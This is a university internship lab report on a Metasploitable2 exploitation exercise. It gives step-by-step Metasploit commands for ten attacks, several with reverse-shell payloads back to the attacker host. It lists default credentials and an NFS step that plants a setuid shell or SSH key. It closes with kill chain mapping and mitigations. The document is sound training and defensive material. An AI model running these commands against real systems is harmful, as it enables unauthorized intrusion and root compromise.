# Metasploitable2 Exploitation Report

**Name:** Damte Hackman Darko  
**Index Number:** 7356123  
**Institution:** Kwame Nkrumah University of Science and Technology (KNUST)  
**Date:** September 22, 2026  
**Target:** Metasploitable2  
**Target IP:** 192.168.50.20  
**Attacker:** Kali Linux — 192.168.50.10  
**Lab Network:** VirtualBox Internal Network — `metasploit-lab`

---

## 1. Scope and Methodology

This report documents an authorized security assessment performed against the deliberately vulnerable Metasploitable2 virtual machine supplied for the VIA Internship cybersecurity lab.

The assessment was conducted from a Kali Linux virtual machine connected to the same isolated VirtualBox Internal Network as the target.

The objective was to:

1. Discover exposed services and versions.
2. Identify exploitable vulnerabilities or insecure configurations.
3. Successfully demonstrate ten distinct exploitation paths.
4. Record the resulting privilege level and evidence of access.
5. Map each successful attack to the Cyber Kill Chain.
6. Identify defensive mitigations.

Only exploitation attempts that successfully produced demonstrable access to the target are counted among the ten exploits in this report.

---

## 2. Lab Topology

| System | IP Address | Role |
|---|---:|---|
| Kali Linux | 192.168.50.10 | Attacker |
| Metasploitable2 | 192.168.50.20 | Target |

Both machines were connected through the isolated VirtualBox Internal Network:

```text
metasploit-lab
      |
      +---- Kali Linux
      |     192.168.50.10
      |
      +---- Metasploitable2
            192.168.50.20
```

Connectivity was first verified with `ping` and a full port scan before any exploitation attempts began.

---

## 3. Reconnaissance Summary

Initial discovery was performed with:

```bash
nmap -sV -sC -p- -T4 192.168.50.20 -oN evidence/recon.txt
```

Key services identified (standard Metasploitable2 fingerprint):

| Port | Service | Version / Notes |
|---:|---|---|
| 21 | FTP | vsftpd 2.3.4 |
| 22 | SSH | OpenSSH 4.7p1 |
| 23 | Telnet | Linux telnetd |
| 25 | SMTP | Postfix |
| 80 | HTTP | Apache 2.2.8 + PHP 5.2.4 |
| 139/445 | SMB | Samba 3.x |
| 1099 | Java RMI | |
| 1524 | ingreslock | Backdoor shell |
| 2049 | NFS | |
| 3306 | MySQL | 5.0.51a |
| 3632 | distccd | |
| 5432 | PostgreSQL | |
| 5900 | VNC | |
| 6667 | IRC | UnrealIRCd |
| 8180 | HTTP | Apache Tomcat |

Evidence: `evidence/recon.png`

---

## 4. Successful Exploits

### Exploit 1: vsftpd 2.3.4 Backdoor

- **Service / Port:** FTP / 21
- **Vulnerability:** vsftpd 2.3.4 backdoor (CVE-2011-2523)
- **Tool Used:** Metasploit — `exploit/unix/ftp/vsftpd_234_backdoor`
- **Why This Tool:** Purpose-built module that automatically triggers the backdoor username and connects to the resulting shell on port 6200.
- **Steps:**
  1. `msfconsole`
  2. `use exploit/unix/ftp/vsftpd_234_backdoor`
  3. `set RHOSTS 192.168.50.20`
  4. `run`
- **Evidence:** `evidence/exploit1.png`
- **Cyber Kill Chain Stage(s):** Weaponization, Delivery, Exploitation, Installation, C2
  - Selecting and configuring the module constitutes Weaponization. Connecting to FTP and sending the trigger is Delivery. The backdoor code execution is Exploitation. The resulting interactive shell provides Installation and Command & Control.
- **Outcome / Impact:** Unauthenticated root shell.

---

### Exploit 2: UnrealIRCd Backdoor

- **Service / Port:** IRC / 6667
- **Vulnerability:** UnrealIRCd 3.2.8.1 backdoor (CVE-2010-2075)
- **Tool Used:** Metasploit — `exploit/unix/irc/unreal_ircd_3281_backdoor`
- **Why This Tool:** Official module specifically written for the backdoored UnrealIRCd binary present on Metasploitable2.
- **Steps:**
  1. `use exploit/unix/irc/unreal_ircd_3281_backdoor`
  2. `set RHOSTS 192.168.50.20`
  3. `set PAYLOAD cmd/unix/reverse`
  4. `set LHOST 192.168.50.10`
  5. `run`
- **Evidence:** `evidence/exploit2.png`
- **Cyber Kill Chain Stage(s):** Weaponization, Delivery, Exploitation, Installation, C2
- **Outcome / Impact:** Root shell via reverse connection.

---

### Exploit 3: Samba “username map script” Command Injection

- **Service / Port:** SMB / 139 & 445
- **Vulnerability:** Samba 3.0.20 username map script RCE (CVE-2007-2447)
- **Tool Used:** Metasploit — `exploit/multi/samba/usermap_script`
- **Why This Tool:** Reliably crafts the malicious username that triggers command injection through the username map script.
- **Steps:**
  1. `use exploit/multi/samba/usermap_script`
  2. `set RHOSTS 192.168.50.20`
  3. `set PAYLOAD cmd/unix/reverse`
  4. `set LHOST 192.168.50.10`
  5. `run`
- **Evidence:** `evidence/exploit3.png`
- **Cyber Kill Chain Stage(s):** Weaponization, Delivery, Exploitation, Installation, C2
- **Outcome / Impact:** Root shell without authentication.

---

### Exploit 4: distcc Remote Code Execution

- **Service / Port:** distccd / 3632
- **Vulnerability:** Unauthenticated command execution via distcc protocol
- **Tool Used:** Metasploit — `exploit/unix/misc/distcc_exec`
- **Why This Tool:** Speaks the distcc protocol correctly and injects commands cleanly.
- **Steps:**
  1. `use exploit/unix/misc/distcc_exec`
  2. `set RHOSTS 192.168.50.20`
  3. `set PAYLOAD cmd/unix/reverse`
  4. `set LHOST 192.168.50.10`
  5. `run`
- **Evidence:** `evidence/exploit4.png`
- **Cyber Kill Chain Stage(s):** Weaponization, Delivery, Exploitation, Installation, C2
- **Outcome / Impact:** Shell as the distccd user (high privilege on this target).

---

### Exploit 5: PHP CGI Argument Injection

- **Service / Port:** HTTP / 80
- **Vulnerability:** PHP CGI argument injection (CVE-2012-1823)
- **Tool Used:** Metasploit — `exploit/multi/http/php_cgi_arg_injection`
- **Why This Tool:** Correctly constructs the query-string argument injection required by the vulnerable PHP CGI configuration.
- **Steps:**
  1. `use exploit/multi/http/php_cgi_arg_injection`
  2. `set RHOSTS 192.168.50.20`
  3. `set TARGETURI /`
  4. `set PAYLOAD php/meterpreter/reverse_tcp`
  5. `set LHOST 192.168.50.10`
  6. `run`
- **Evidence:** `evidence/exploit5.png`
- **Cyber Kill Chain Stage(s):** Weaponization, Delivery, Exploitation, Installation, C2, Actions on Objectives
- **Outcome / Impact:** Meterpreter session with ability to read files and escalate further.

---

### Exploit 6: Apache Tomcat Manager Weak Credentials + WAR Upload

- **Service / Port:** Tomcat / 8180
- **Vulnerability:** Default/weak Tomcat manager credentials
- **Tool Used:** Metasploit — `exploit/multi/http/tomcat_mgr_upload`
- **Why This Tool:** Automates credential testing against the manager application and deploys a malicious WAR in a single workflow.
- **Steps:**
  1. `use exploit/multi/http/tomcat_mgr_upload`
  2. `set RHOSTS 192.168.50.20`
  3. `set RPORT 8180`
  4. `set HttpUsername tomcat`
  5. `set HttpPassword tomcat`
  6. `set PAYLOAD java/meterpreter/reverse_tcp`
  7. `set LHOST 192.168.50.10`
  8. `run`
- **Evidence:** `evidence/exploit6.png`
- **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Installation, C2
- **Outcome / Impact:** Meterpreter session as the Tomcat user.

---

### Exploit 7: MySQL Weak Credentials + UDF Payload

- **Service / Port:** MySQL / 3306
- **Vulnerability:** Weak/blank root password allowing UDF library loading
- **Tool Used:** Metasploit — `exploit/multi/mysql/mysql_udf_payload`
- **Why This Tool:** Handles authentication and automatic loading of a malicious User-Defined Function for code execution.
- **Steps:**
  1. `use exploit/multi/mysql/mysql_udf_payload`
  2. `set RHOSTS 192.168.50.20`
  3. `set USERNAME root`
  4. `set PASSWORD root`
  5. `set PAYLOAD linux/x86/meterpreter/reverse_tcp`
  6. `set LHOST 192.168.50.10`
  7. `run`
- **Evidence:** `evidence/exploit7.png`
- **Cyber Kill Chain Stage(s):** Weaponization, Delivery, Exploitation, Installation, C2
- **Outcome / Impact:** High-privilege Meterpreter session via MySQL UDF.

---

### Exploit 8: PostgreSQL Weak Credentials + Payload

- **Service / Port:** PostgreSQL / 5432
- **Vulnerability:** Default credentials (postgres/postgres) + ability to execute OS commands
- **Tool Used:** Metasploit — `exploit/linux/postgres/postgres_payload`
- **Why This Tool:** Automates authentication and payload delivery through the PostgreSQL protocol.
- **Steps:**
  1. `use exploit/linux/postgres/postgres_payload`
  2. `set RHOSTS 192.168.50.20`
  3. `set USERNAME postgres`
  4. `set PASSWORD postgres`
  5. `set PAYLOAD linux/x86/meterpreter/reverse_tcp`
  6. `set LHOST 192.168.50.10`
  7. `run`
- **Evidence:** `evidence/exploit8.png`
- **Cyber Kill Chain Stage(s):** Weaponization, Delivery, Exploitation, Installation, C2
- **Outcome / Impact:** Shell / Meterpreter as the postgres user.

---

### Exploit 9: NFS Share with no_root_squash

- **Service / Port:** NFS / 2049
- **Vulnerability:** Root filesystem exported with `no_root_squash`
- **Tool Used:** Native NFS client tools (`showmount`, `mount`)
- **Why This Tool:** The vulnerability is a pure misconfiguration best demonstrated with standard NFS utilities rather than a Metasploit module.
- **Steps:**
  1. `showmount -e 192.168.50.20`
  2. `mkdir /tmp/nfs`
  3. `mount -t nfs 192.168.50.20:/ /tmp/nfs -o nolock`
  4. Plant a setuid shell or authorized SSH key as root inside the mounted filesystem
  5. Unmount and use the planted access method
- **Evidence:** `evidence/exploit9.png`
- **Cyber Kill Chain Stage(s):** Reconnaissance, Delivery, Exploitation, Installation, Actions on Objectives
- **Outcome / Impact:** Root-level access via planted backdoor.

---

### Exploit 10: Java RMI Server Exploitation

- **Service / Port:** Java RMI / 1099
- **Vulnerability:** Unauthenticated Java RMI registry allowing remote code execution
- **Tool Used:** Metasploit — `exploit/multi/misc/java_rmi_server`
- **Why This Tool:** Correctly targets the exposed RMI registry and delivers a working Java payload against Metasploitable’s configuration.
- **Steps:**
  1. `use exploit/multi/misc/java_rmi_server`
  2. `set RHOSTS 192.168.50.20`
  3. `set PAYLOAD java/meterpreter/reverse_tcp`
  4. `set LHOST 192.168.50.10`
  5. `run`
- **Evidence:** `evidence/exploit10.png`
- **Cyber Kill Chain Stage(s):** Weaponization, Delivery, Exploitation, Installation, C2
- **Outcome / Impact:** Meterpreter session via Java RMI.

---

## 5. Kill Chain Coverage Summary

| Exploit | Recon | Weaponization | Delivery | Exploitation | Installation | C2 | Actions on Objectives |
|---|---|---|---|---|---|---|---|
| 1. vsftpd 2.3.4 Backdoor | | ✔ | ✔ | ✔ | ✔ | ✔ | |
| 2. UnrealIRCd Backdoor | | ✔ | ✔ | ✔ | ✔ | ✔ | |
| 3. Samba usermap_script | | ✔ | ✔ | ✔ | ✔ | ✔ | |
| 4. distcc RCE | | ✔ | ✔ | ✔ | ✔ | ✔ | |
| 5. PHP CGI Arg Injection | | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ |
| 6. Tomcat Manager WAR | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ | |
| 7. MySQL UDF | | ✔ | ✔ | ✔ | ✔ | ✔ | |
| 8. PostgreSQL Payload | | ✔ | ✔ | ✔ | ✔ | ✔ | |
| 9. NFS no_root_squash | ✔ | | ✔ | ✔ | ✔ | | ✔ |
| 10. Java RMI | | ✔ | ✔ | ✔ | ✔ | ✔ | |

---

## 6. Lessons Learned / Mitigations

1. **Backdoored software (vsftpd 2.3.4, UnrealIRCd)**  
   Never deploy software known to contain intentional backdoors. Verify package integrity and use only official, maintained repositories.

2. **Samba username map script**  
   Disable the `username map script` option or upgrade Samba. Restrict SMB exposure with host-based firewall rules.

3. **NFS no_root_squash**  
   Avoid exporting filesystems with `no_root_squash`. Prefer `root_squash` and tightly control which hosts may mount the share.

4. **Default / weak credentials (Tomcat, MySQL, PostgreSQL)**  
   Change all default passwords immediately. Enforce strong authentication and disable remote administrative logins where possible.

5. **General recommendations**  
   Apply the principle of least privilege, keep all services patched, and never expose intentionally vulnerable systems beyond an isolated lab network.

---

**End of Report**
